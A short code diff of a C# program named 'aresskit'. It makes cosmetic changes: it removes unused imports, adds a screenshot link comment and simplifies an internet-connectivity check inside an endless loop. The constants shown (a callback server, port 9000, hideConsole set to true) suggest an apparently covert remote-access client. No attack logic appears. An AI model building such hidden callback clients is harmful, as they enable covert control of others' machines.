@@ -1,13 +1,11 @@
 ﻿using System;
 using System.Linq;
 using System.Reflection;
-using System.Runtime.InteropServices;
-using System.Threading;
 
 namespace aresskit
 {
     class Program
-    {
+    {   // http://prntscr.com/grsrlu
         const string server = "localhost";
         const int port = 9000;
         const bool hideConsole = true;
@@ -148,7 +146,7 @@ namespace aresskit
             
             while (true)
             {
-                if (Network.checkInternetConn("www.google.com") == true)
+                if (Network.checkInternetConn("www.google.com"))
                 {
                     try
                     {
